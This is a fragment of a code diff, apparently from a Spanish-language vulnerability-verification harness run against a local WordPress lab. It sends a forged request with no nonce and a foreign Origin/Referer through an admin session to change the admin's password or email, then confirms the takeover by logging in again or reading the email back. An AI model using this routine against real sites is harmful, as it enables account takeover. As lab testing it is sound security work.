+            resp = boot.admin_sess.request(m, boot.base_url + endpoint,
+                               data=payload if m != "GET" else None,
+                               params=payload if m == "GET" else None,
+                               headers=headers, timeout=20)
+            res.evidence["status_code_respuesta"] = resp.status_code
+        except Exception as e:
+            res.detail = f"la peticion forjada fallo: {e}"
+            return res
+
+        confirmed = False
+        if new_pass:
+            step("confirmando: intentando iniciar sesion de nuevo como el admin con la password "
+                 "NUEVA (forjada)...")
+            confirm_sess = _wp_login(boot.base_url, boot.admin_user, new_pass)
+            confirmed = confirm_sess is not None
+            res.evidence["segundo_login_password_nueva"] = confirmed
+        elif new_email:
+            step("confirmando: releyendo el registro del usuario para comprobar el email "
+                 "cambiado...")
+            r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
+            actual_email = (r.stdout or "").strip()
+            confirmed = actual_email == new_email
+            res.evidence["email_tras_peticion"] = actual_email
+            res.evidence["email_esperado"] = new_email
+
+        if confirmed:
+            res.verified = True
+            res.ok = True
+            res.detail = ("CSRF confirmado: una peticion SIN nonce, con Origin/Referer de un "
+                          "dominio externo ficticio, usando la sesion YA autenticada del admin, "
+                          "cambio de verdad su propia cuenta -- el endpoint no comprueba nonce ni "
+                          "origen")
+            step("VERIFICADO: CSRF confirmado -- la peticion forjada sin nonce cambio la cuenta "
+                 "del admin.")
+        else:
+            res.ok = True
+            res.detail = ("se envio la peticion forjada pero el efecto no se confirmo -- el CSRF "
+                          "no se confirmo (puede que el endpoint SI compruebe nonce/origen, o que "
+                          "el payload/endpoint no sean los reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
